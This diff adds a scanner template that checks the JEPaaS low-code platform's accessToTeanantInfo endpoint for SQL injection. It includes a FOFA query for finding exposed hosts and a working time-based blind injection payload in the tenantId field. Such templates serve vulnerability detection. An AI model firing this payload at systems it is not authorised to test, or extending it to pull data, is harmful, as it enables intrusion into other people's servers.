@@ -1,0 +1,51 @@
+id: poc-yaml-jepaas-accesstoteanantinfo-sqli
+info:
+  name: JEPaaS低代码平台 accessToTeanantInfo SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    fofa-query: icon_hash="-999810473"
+
+variables:
+  t1: '{{rand_int(4,9)}}'
+  t2: '{{to_number(t1) + 2}}'
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: check-platform
+    method: GET
+    path:
+      - "{{BaseURL}}/login.html"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "JEPaaS云平台"
+        part: body
+
+  - id: test-sqli
+    method: POST
+    path:
+      - "{{BaseURL}}/rbac/im/accessToTeanantInfo"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "tenantId=1' AND (SELECT 2805 FROM (SELECT(SLEEP({{t1}})))moYz)-- sBPi"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - '{"totalCount":0,"rows":[]}'
+        part: body
+      - type: dsl
+        dsl:
+          - duration > t1
+          - duration < t2
